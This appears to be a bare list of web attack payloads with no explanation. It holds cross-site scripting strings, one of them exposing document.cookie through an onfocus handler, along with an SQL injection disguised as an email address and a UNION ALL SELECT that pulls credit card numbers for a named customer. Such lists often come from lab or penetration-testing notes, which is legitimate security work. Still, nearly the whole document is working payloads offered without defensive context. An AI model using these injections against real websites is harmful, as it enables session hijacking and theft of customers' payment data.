```javascript
<img onmouseover="alert('XSS')">

```
```javascript
test'or''!='2@test.com
```

```javascript
<input type="text" name="address1" value="" onfocus="alert(document.cookie)">
```

```javascript
(select  username from customer where username='Mary Martin')
```

```javascript
' UNION ALL SELECT creditCardNumber FROM customers WHERE customerName = 'Mary Martin
```